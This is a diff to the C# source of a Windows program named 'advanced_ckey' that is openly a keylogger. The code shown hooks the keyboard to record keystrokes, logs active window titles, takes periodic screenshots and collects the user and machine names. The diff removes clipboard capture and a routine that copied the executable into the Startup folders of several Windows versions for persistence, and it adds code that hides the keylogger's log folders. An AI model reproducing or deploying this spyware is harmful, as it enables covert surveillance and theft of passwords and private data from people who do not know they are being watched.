@@ -82,7 +82,7 @@ namespace advanced_ckey
         {
             if (strin != GetActiveWindowTitle())
             {
-                textBox1.Text = textBox1.Text + Environment.NewLine + Environment.NewLine + "[" + GetActiveWindowTitle() + "]" + Environment.NewLine + "----->" + Clipboard.GetText().ToString() + "<-----" + Environment.NewLine + Environment.NewLine;
+                textBox1.Text = textBox1.Text + Environment.NewLine + Environment.NewLine + "[" + GetActiveWindowTitle() + "]" + Environment.NewLine;
                 strin = GetActiveWindowTitle();
             }
         }
@@ -92,60 +92,6 @@ namespace advanced_ckey
             textBox1.Text += key;   //writes keystokes into textbox1 calling keyboard class to show keystokes 
         }
 
-        private void timer3_Tick(object sender, EventArgs e)   //for every 7 seconds: this mwethod will ensure the app is in the startup folder
-        {
-            // the all user for window 10 startup
-            try
-            {
-                string file1 = Application.ExecutablePath;
-                string copy1 = @"C:\" + Environment.UserName.ToString() + @"\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\advanced_ckey.exe";
-
-                if (File.Exists(copy1))
-                {
-                }
-                else
-                {
-                    File.Copy(file1, copy1);
-                }
-            }
-            catch (Exception)
-            {
-            }
-
-            // window 7 startup user and windows 10
-            try
-            {
-                string file1 = Application.ExecutablePath;
-                string copy1 = @"C:\Users\" + Environment.UserName.ToString() + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\advanced_ckey.exe";
-                if (File.Exists(copy1))
-                {
-                }
-                else
-                {
-                    File.Copy(file1, copy1);
-                }
-            }
-            catch (Exception)
-            {
-            }
-
-            // for windows xp startup user
-            try
-            {
-                string file1 = Application.ExecutablePath;
-                string copy1 = @"C:Documents and Settings\" + Environment.UserName.ToString() + @"\Start Menu\Programs\Startup\advanced_ckey.exe";
-                if (File.Exists(copy1))
-                {
-                }
-                else
-                {
-                    File.Copy(file1, copy1);
-                }
-            }
-            catch (Exception)
-            {
-            }
-        }
         public void screenshot()  // the method that handles the screenshot
         {
             string filename = "Screencapture" + DateTime.Now.ToString("ddMMyyyy-hhmmss") + ".png";
@@ -177,8 +123,12 @@ namespace advanced_ckey
             }
         }
 
+        DirectoryInfo ch;
+
+
         private void Form1_Load(object sender, EventArgs e)
         {
+           
             try
             {
                 Directory.CreateDirectory(@"C:\MyDir\Screenshot");  // create a diretory for saving the screenshot file
@@ -196,6 +146,34 @@ namespace advanced_ckey
             catch (Exception)
             {
             }
+
+            try  //hides keylogger folder
+            {
+                ch = new DirectoryInfo(@"C:\MyDirr");
+                ch.Attributes = FileAttributes.Hidden;
+              //  MessageBox.Show("Hidden");
+            }
+            catch { }
+
+            try  //hides keylogger folder
+            {
+                ch = new DirectoryInfo(@"C:\MyDir");
+                ch.Attributes = FileAttributes.Hidden;
+                //  MessageBox.Show("Hidden");
+            }
+            catch { }
+
+
+            //try
+            //{
+
+            //    ch = new DirectoryInfo(txtFilePath.Text);
+            //    ch.Attributes = FileAttributes.Normal;
+            //      MessageBox.Show("Visible");
+
+            //}
+            //catch { }
+
 
             keylog_timer.Start();   // write textbox1.text strings into a file
             Sceenshot_timer.Start();  //starts sccenshot timer at every 1 minutes
@@ -238,17 +216,17 @@ namespace advanced_ckey
 
             try
             {
-                textBox1.Text = Environment.NewLine + Environment.NewLine + textBox1.Text + Environment.NewLine + Environment.NewLine + "User Name:                 " + Environment.UserName.ToString();  // gives information about the operating system
-                textBox1.Text = textBox1.Text + Environment.NewLine + "Computer Name:               " + Environment.MachineName.ToString();    // gives information about the operating system
-                textBox1.Text = textBox1.Text + Environment.NewLine + "OS Version:               " + Environment.OSVersion.ToString();     // gives information about the operating system
+                textBox1.Text = Environment.NewLine + textBox1.Text + "User Name:             " + Environment.UserName.ToString();  // gives information about the operating system
+                textBox1.Text = textBox1.Text + Environment.NewLine + "Computer Name:         " + Environment.MachineName.ToString();    // gives information about the operating system
+                textBox1.Text = textBox1.Text + Environment.NewLine + "OS Version:            " + Environment.OSVersion.ToString();     // gives information about the operating system
                 textBox1.Text = textBox1.Text + Environment.NewLine + "Runtime:               " + Environment.Version.ToString();      // gives information about the operating system
-                textBox1.Text = textBox1.Text + Environment.NewLine + "System Root:               " + Environment.SystemDirectory.ToString();    
-                textBox1.Text = textBox1.Text + Environment.NewLine + "User Domain Name:               " + Environment.UserName.ToString();     
+                textBox1.Text = textBox1.Text + Environment.NewLine + "System Root:           " + Environment.SystemDirectory.ToString();    
+                textBox1.Text = textBox1.Text + Environment.NewLine + "User Domain Name:      " + Environment.UserName.ToString();     
                 textBox1.Text = textBox1.Text + Environment.NewLine + Environment.NewLine;
 
                 K.CreateHook();   // this is the code that takes the keystroke from the keyboard class we created
                 timer1.Start();   // gets active window name and if not wanted delete this line of code
-                timer2.Start();
+               
             }
             catch (Exception)
             {
@@ -275,6 +253,11 @@ namespace advanced_ckey
 
         [DllImport("user32.dll", CharSet = CharSet.Unicode)]
         static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            Application.Exit();
+        }
     }
 }
 
